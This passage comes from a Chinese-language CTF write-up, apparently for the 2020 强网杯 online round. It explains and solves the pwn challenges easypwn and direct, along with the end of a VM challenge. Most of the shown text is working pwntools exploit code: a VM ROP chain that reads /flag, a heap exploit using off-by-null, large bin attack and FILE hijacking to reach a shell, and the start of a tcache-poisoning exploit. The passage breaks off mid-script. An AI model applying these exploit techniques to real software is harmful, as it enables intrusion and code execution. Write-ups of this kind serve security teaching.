class="number">0x40</span>, <span class="number">0x07</span>, <span class="number">0x24</span>, <span class="number">0x10</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x41</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x74</span>, <span class="number">0x12</span>]</span><br><span class="line">a2 = [<span class="number">0xFA</span>, <span class="number">0xED</span>, <span class="number">0x70</span>, <span class="number">0x5E</span>, <span class="number">0x70</span>, <span class="number">0x22</span>, <span class="number">0x3A</span>, <span class="number">0x21</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0x23</span>, <span class="number">0xC1</span>, <span class="number">0xAB</span>, <span class="number">0x12</span>, <span class="number">0x58</span>, <span class="number">0x96</span>, <span class="number">0x34</span>, <span class="number">0x86</span>]</span><br><span class="line">a2 = [<span class="number">0x77</span>, <span class="number">0xB3</span>, <span class="number">0xD2</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0x5A</span>, <span class="number">0xA7</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x36</span>, <span class="number">0x12</span>, <span class="number">0x78</span>, <span class="number">0x16</span>, <span class="number">0x32</span>, <span class="number">0x12</span>]</span><br><span class="line">a2 = [<span class="number">0xDD</span>, <span class="number">0x37</span>, <span class="number">0x71</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p> 即可得到：<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>。</p></li><li><p>接下来<code>check</code>通过，可以向栈上写入<code>0x800</code>bytes数据，之后通过<code>ret</code>，也就是从栈上取出地址再跳转。而写入的<code>0x800</code>字节可以覆盖这个返回地址，那么这样看来这个题目其实就是需要通过在vm中实现rop。</p></li><li><p>根据前面所分析的，存在<code>open</code>，<code>read</code>，<code>write</code>调用，而且对跳转地址有范围内的检查，所以只能在载入的<code>test.bin</code>寻找vm gadget，然后通过orw的方式获取flag。</p><p> 而其实也不难注意到<code>test.bin</code>中存在一段比较可疑的数据，仔细查看可以发现</p><p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/pop_regs.png" alt="pop_regs"></p><p> 存在上图这样的<code>pop r0; ret;</code>和<code>pop r1; ret;</code>等gadget，也就是说<code>r0, r1, r2, r3</code>都是可控的，满足了0x20调用的条件，而且：</p><p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/syscall.png" alt="syscall"></p><p> 同时存在0x20调用。</p></li><li><p>那么就很简单了，通过构造rop的方式来orw即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'47.94.20.173'</span>, <span class="number">32142</span>)</span><br><span class="line"></span><br><span class="line">pop_r0 = <span class="number">0x2F5</span></span><br><span class="line">pop_r1 = <span class="number">0x377</span></span><br><span class="line">pop_r2 = <span class="number">0x45C</span></span><br><span class="line">pop_r3 = <span class="number">0x4E1</span></span><br><span class="line">syscall = <span class="number">0x5B1</span> <span class="comment"># read is 1, write is 2</span></span><br><span class="line">syscall_open = <span class="number">0x6ED</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">'QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO'</span></span><br><span class="line">p.sendafter(<span class="string">"password: \n"</span>, password)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x108</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">1</span>, pop_r1, <span class="number">0</span>, pop_r2, <span class="number">0</span>, pop_r3, <span class="number">0x8</span>, syscall]) <span class="comment"># read</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">0</span>, pop_r1, <span class="number">0</span>, pop_r2, <span class="number">0</span>, syscall_open]) <span class="comment"># open </span></span><br><span class="line">payload += flat([pop_r0, <span class="number">1</span>, pop_r1, <span class="number">4</span>, pop_r2, <span class="number">0x10</span>, pop_r3, <span class="number">0x40</span>, syscall]) <span class="comment"># read</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">2</span>, pop_r1, <span class="number">1</span>, pop_r2, <span class="number">0x10</span>, pop_r3, <span class="number">0x40</span>, syscall]) <span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"PWNITNOW!GOGO!"</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">"/flag\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h1><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>首先binary通过<code>mallopt(1, 0)</code>禁用了fastbin，但是在<code>read_str</code>中存在一个<code>off by null</code>：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_str</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">-1</span>; ; *(_BYTE *)(a1 + i) = buf )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i + <span class="number">1</span> &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a2 + <span class="number">1</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a2 - <span class="number">1</span> == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      buf = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(a1 + ++i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>其次注意到binary是没有<code>show</code>功能的，所以很容易想到要打<code>stdout</code>来leak libc。</p></li><li><p>在没有fastbin的情况下，那么可以利用这个off by null完成unlink attack，形成chunk overlap，可以伪造出large bin，来进行large bin attack。因为我们知道在将一个比原large bin的size要大的unsorted bin链入large bin的时候，会使得<code>large bin-&gt;bk-&gt;fd = unsorted bin</code>以及<code>large bin-&gt;bk_nextsize-&gt;fd_nextsize = unsorted bin</code>，也就是能达到同时向两个任意地址写入堆块地址的目的。</p></li><li><p>同时注意到只要控制<code>stdout</code>的<code>_flags = 0xXXXXY800</code>（Y为奇数）以及<code>_IO_write_base &lt; _IO_write_ptr</code>即可触发输出相应缓冲区数据效果，从而leak出libc，所以采用控制unsorted bin的地址的低2 bytes（Y由于ASLR而随机）为<code>Y800</code>然后通过<code>large bin-&gt;bk-&gt;fd</code>写入，以及错位写<code>_IO_write_base</code>的低字节为<code>\x00</code>的方法。</p></li><li><p>而由于large bin的<code>fd_nextsize</code>和<code>bk_nextsize</code>都是堆地址，我们要改到<code>stdout</code>的地方只能通过partial write，所以还要稍微做一下堆的排布，使得两个unsorted bin的<code>bk</code>分别先后占住large bin的<code>bk_nextsize</code>和<code>bk</code>的位置。</p></li><li><p>leak出libc之后，再通过一次large bin attack覆盖<code>_IO_list_all</code>为可控的堆地址，这样就能劫持<code>_IO_FILE</code>的vtable写入onegadget，在binary进行<code>exit</code>的时候触发来getshell。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0x3c5620</span></span><br><span class="line">_IO_list_all_offset = libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 3</span></span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 4</span></span><br><span class="line">        add(<span class="number">0x2E8</span>) <span class="comment"># chunk 5</span></span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 6</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">3</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x3E</span> + <span class="string">'\n'</span>) </span><br><span class="line">        edit(<span class="number">4</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x1F</span> + p64(<span class="number">0x8F0</span>)) <span class="comment"># off by null</span></span><br><span class="line">        edit(<span class="number">5</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x2E</span> + <span class="string">'\n'</span>) </span><br><span class="line">        edit(<span class="number">6</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x1F</span> + <span class="string">'\n'</span>) </span><br><span class="line">        delete(<span class="number">0</span>) </span><br><span class="line">        delete(<span class="number">5</span>) <span class="comment"># unlink attack</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>) <span class="comment"># unsorted bin</span></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 5 (gap)</span></span><br><span class="line">        add(<span class="number">0x18</span>) <span class="comment"># chunk 7 (gap)</span></span><br><span class="line">        add(<span class="number">0x2D8</span>) <span class="comment"># chunk 8 (use all)</span></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        add(<span class="number">0x2D8</span>) <span class="comment"># chunk 3 (get large bin)</span></span><br><span class="line"></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x108</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x1E8</span>) <span class="comment"># chunk 8 (use all)</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0x28</span>) <span class="comment"># chunk 9 (use all)</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">4</span>, <span class="string">"A"</span> * <span class="number">0xE8</span> + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x421</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        delete(<span class="number">3</span>) <span class="comment"># unsorted bin</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># libc_base = _base(_libc)</span></span><br><span class="line">        target = <span class="number">0x5620</span> + <span class="number">0x5000</span><span class="comment"># + libc_base</span></span><br><span class="line">        edit(<span class="number">9</span>, p64(<span class="number">0</span>) + p16(target - <span class="number">0x10</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p16(target - <span class="number">0x20</span> + <span class="number">0x19</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x3D8</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">"\x00"</span> * <span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c36e0</span></span><br><span class="line">        _IO_list_all = libc_base + _IO_list_all_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line">        heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"fail"</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack again</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + \</span><br><span class="line">     p64(<span class="number">0x401</span>) + p64(libc_base + <span class="number">0x3C4F68</span>) + p64(_IO_list_all - <span class="number">0x10</span>) + \</span><br><span class="line">     p64(heap_base + <span class="number">0x300</span>) * <span class="number">2</span> + <span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"A"</span> * <span class="number">0xE0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x3E8</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget) * <span class="number">28</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x411</span>)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">"\x00"</span> * <span class="number">0xA8</span> + p64(heap_base + <span class="number">0x7E0</span> - <span class="number">0xF0</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先这个<code>edit</code>对<code>offset</code>的检查不够严格，所以可以向任意负偏移的位置写值：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)open_status;</span><br><span class="line">  <span class="keyword">if</span> ( open_status )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    result = choice();</span><br><span class="line">    v3 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = chunk_array[result];</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Offset: "</span>);</span><br><span class="line">        v4 = choice();</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Size: "</span>);</span><br><span class="line">        v1 = choice();</span><br><span class="line">        nbytes = v1;</span><br><span class="line">        v2 = v4 + v1;</span><br><span class="line">        result = chunk_size[v3];</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= (__int64)result )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"Content: "</span>);</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(chunk_array[v3] + v4), nbytes);</span><br><span class="line">          result = puts_(<span class="string">"Done!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 那么可以轻易的伪造unsorted bin。</p></li><li><p>但是同时注意到这也是一个”无 leak“的题目，因为没有常规的<code>show</code>功能，而且这个时候因为没有<code>puts</code>，所以通过<code>stdout</code>去leak的思路是行不通的。</p></li><li><p>这个时候关注一下这个<code>opendir</code>和<code>readdir</code>，<code>opendir</code>会在对上开辟一块<code>0x8040</code>大小的chunk，一开始内容是空的，而在调用完<code>readdir</code>之后会发现这个chunk被写入了很多内容，比较明显的就是包含了当前目录下所有的文件名。这个时候查一下<code>readdir</code>到底干了什么:</p><p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/struct.png" alt="struct"></p><p> 大概就是<code>readdir</code>会返回一个指向当前文件信息的结构体，而在<code>close file</code>功能的<code>result = puts_((const char *)(v1 + 19));</code>也可以看出，这个<code>+19</code>正好就是指向文件名了，也就是<code>d_name</code>。</p></li><li><p>那么leak的思路就有了，就是利用unsorted bin-&gt;fd或bk，将某个结构体的<code>d_name</code>给覆盖掉，那么在某次调用<code>close file</code>打印文件名的时候，就会把这fd或者bk给打印出来，从而leak出libc。</p></li><li><p>接下就是直接<code>tcache poisoning</code>打<code>__free_hook</code>为<code>system</code>即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">""" N0p / AAA """</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'106.14.214.3'</span>, <span class="number">1912</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, offset, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span 